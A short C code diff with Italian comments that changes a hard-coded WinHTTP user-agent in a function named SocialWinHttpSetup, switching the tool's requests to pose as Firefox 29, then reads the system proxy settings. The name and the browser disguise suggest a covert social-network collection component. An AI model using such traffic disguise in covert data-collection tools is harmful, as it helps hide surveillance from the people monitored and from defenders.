@@ -108,7 +108,8 @@ VOID SocialWinHttpSetup(__in LPWSTR strDestUrl)
 	ZeroMemory(&ProxyConfig, sizeof(ProxyConfig));
 
 	// Crea una sessione per winhttp.
-	gHttpSocialSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent
+	gHttpSocialSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent
+	//gHttpSocialSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent
 
 	// Cerca nel registry le configurazioni del proxy
 	if (gHttpSocialSession && WinHttpGetIEProxyConfigForCurrentUser(&ProxyConfig)) 
